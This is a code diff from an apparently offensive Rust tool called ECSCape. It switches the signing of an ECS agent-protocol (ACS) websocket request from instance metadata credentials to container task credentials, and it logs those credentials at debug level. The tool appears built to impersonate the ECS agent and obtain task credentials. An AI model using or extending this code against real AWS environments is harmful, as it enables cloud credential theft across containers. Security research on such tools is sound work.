@@ -13,6 +13,7 @@ use url::Url;
 use crate::config::{
     ACS_PROTOCOL_SEC_NUM, ACS_PROTOCOL_SEND_CREDENTIALS, ACS_PROTOCOL_VERSION, DOCKER_VERSION,
 };
+use crate::container_credentials::ContainerCredentials;
 use crate::ecs_agent_metadata::ECSAgentMetadata;
 use crate::ecs_protocol_client::ECSProtocolClient;
 use crate::imds_metadata::IMDSMetadata;
@@ -22,6 +23,7 @@ use crate::utils::{build_ws_url, create_sigv4_signed_request};
 pub struct ECSCape {
     imds_metadata: IMDSMetadata,
     ecs_agent_metadata: ECSAgentMetadata,
+    container_credentials: ContainerCredentials,
 }
 
 impl ECSCape {
@@ -32,9 +34,13 @@ impl ECSCape {
         let ecs_agent_metadata = ECSAgentMetadata::try_new(&imds_metadata.local_ip).await?;
         debug!("ecs agent metadata: {:#?}", ecs_agent_metadata);
 
+        let container_credentials = ContainerCredentials::try_new().await?;
+        debug!("container credentials: {:#?}", container_credentials);
+
         Ok(Self {
             imds_metadata,
             ecs_agent_metadata,
+            container_credentials,
         })
     }
 
@@ -47,9 +53,9 @@ impl ECSCape {
         let signed_request = create_sigv4_signed_request(
             acs_url,
             &self.imds_metadata.aws_region,
-            self.imds_metadata.aws_access_key_id.clone(),
-            self.imds_metadata.aws_access_secret_key.clone(),
-            self.imds_metadata.aws_access_token.clone(),
+            self.container_credentials.access_key_id.clone(),
+            self.container_credentials.secret_access_key.clone(),
+            self.container_credentials.token.clone(),
         )?;
 
         let acs_client = ECSProtocolClient::new(signed_request);
